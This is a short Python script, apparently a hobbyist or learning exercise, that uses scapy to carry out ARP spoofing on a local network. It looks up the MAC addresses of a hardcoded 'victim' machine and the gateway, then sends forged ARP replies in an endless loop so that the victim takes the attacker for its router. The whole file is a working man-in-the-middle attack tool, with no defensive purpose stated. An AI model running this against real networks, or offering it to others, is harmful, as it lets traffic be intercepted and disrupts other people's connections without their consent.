#!/usr/bin/env python
import scapy.all as scapy
import time

#gets the mac giving an IP
def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_req_broad = broadcast/arp_req
    ans = scapy.srp(arp_req_broad,timeout=10, verbose=False)[0]

    #take the fist [0]->(only) packet [1]->target info.hwsrc
    return ans[0][1].hwsrc

#(target_ip=victim, spoof_ip=who i pretend)
def spoof_target(target_ip,target_mac, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip )
    scapy.send(packet, verbose=False)


victim_ip = "10.0.0.82"
gtw_ip    = "10.0.0.1"

victim_mac = get_mac(victim_ip)#get mac of victim
gtw_mac    = get_mac(gtw_ip)#get mac of gtw
print("victim " + victim_ip + " with MAC " + victim_mac)
print("Router " + gtw_ip + " with MAC " + gtw_mac)
#spoof them, this way only request for mac once each
while True:
    spoof_target(victim_ip,victim_mac,gtw_ip)
    #spoof_target(gtw_ip,gtw_mac,victim_ip)#spoofing the gw make it wont work!?
    print("Packets sent")
    time.sleep(2)
